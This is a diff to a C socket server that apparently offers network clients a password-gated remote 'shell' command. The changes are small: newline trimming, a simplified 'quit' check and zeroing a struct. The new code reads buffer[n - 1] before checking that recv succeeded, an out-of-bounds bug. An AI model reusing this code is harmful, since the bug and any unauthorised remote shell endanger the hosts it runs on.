@@ -6,6 +6,8 @@
 
 #define SOCKET_ERROR -1
 
+#include <stdio.h>
+
 static unsigned long	hash_djb2(unsigned char *str)
 {
 	unsigned long	hash = 5381;
@@ -87,6 +89,8 @@ static int		read_client(const SOCKET sd, uint8_t *auth)
 	memset(buffer, '\0', MAXMSG);
 	n = recv(sd, buffer, MAXMSG - 1, 0);
 	decrypt_msg(buffer, n);
+	if (buffer[n - 1] == '\n')
+		buffer[n - 1] = '\0';
 	if (n < 0)
 		return (1);
 	else if (n == 0)
@@ -103,9 +107,7 @@ static int		read_client(const SOCKET sd, uint8_t *auth)
 			ask_passwd(sd);
 			return (0);
 		}
-		if ((strcmp(buffer, "quit\n")) == 0)
-			return (1);
-		else if ((strcmp(buffer, "quit") == 0))
+		if ((strcmp(buffer, "quit")) == 0)
 			return (1);
 		else if ((strcmp(buffer, "shell") == 0))
 			return(2);
@@ -279,6 +281,7 @@ int			create_server()
 	struct sockaddr_in	sin;
 
 	sock = 0;
+	memset(&sin, 0, sizeof(sin));
 	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == SOCKET_ERROR)
 		return (-1);
 	sin.sin_addr.s_addr = htonl(INADDR_ANY);
